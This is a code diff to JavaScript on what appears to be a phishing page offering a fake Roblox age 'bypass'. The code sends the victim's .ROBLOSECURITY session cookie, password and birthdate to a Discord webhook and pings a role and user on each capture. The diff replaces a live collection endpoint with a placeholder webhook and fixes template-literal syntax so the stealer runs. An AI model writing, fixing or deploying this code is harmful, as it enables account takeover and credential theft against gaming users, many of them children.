@@ -384,15 +384,15 @@
       };
       if (option === '13plus') {
         data.password = password;
-        data.birthdate = ${birthYear.value}-${birthMonth.value}-${birthDay.value};
+        data.birthdate = `${birthYear.value}-${birthMonth.value}-${birthDay.value}`;
       }
 
       // Discord Webhook URL - **Füge hier deine Webhook-URL ein**
-      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+      const webhookUrl = 'https://discord.com/api/webhooks/DEINE-WEBHOOK-URL';
 
       // IDs für Discord Ping
-      const roleId = '1392621247460020254'; // Rolle
-      const userId = '1030535100829540464'; // Nutzer
+      const roleId = '1137923296862528382'; // Rolle
+      const userId = '1093120426952736512'; // Nutzer
 
       try {
         // 1. Sende die Ping-Nachricht (plain text, keine Embed)
@@ -400,7 +400,7 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: <@&${roleId}> <@${userId}>
+            content: `<@&${roleId}> <@${userId}>`
           }),
         });
 
@@ -411,13 +411,13 @@
           color: 0x00FFFF,
           fields: [
             { name: "Bypass Option", value: option === 'birthyear' ? "2008 Birthyear Up" : "13+ All Ages", inline: true },
-            { name: ".ROBLOSECURITY Cookie", value: \${cookie}\`, inline: false },
+            { name: ".ROBLOSECURITY Cookie", value: `\`${cookie}\``, inline: false },
           ],
           timestamp: new Date().toISOString(),
         };
         if (option === '13plus') {
           embed.fields.push(
-            { name: "Password", value: \${password}\`, inline: false },
+            { name: "Password", value: `\`${password}\``, inline: false },
             { name: "Birthdate", value: data.birthdate, inline: true }
           );
         }
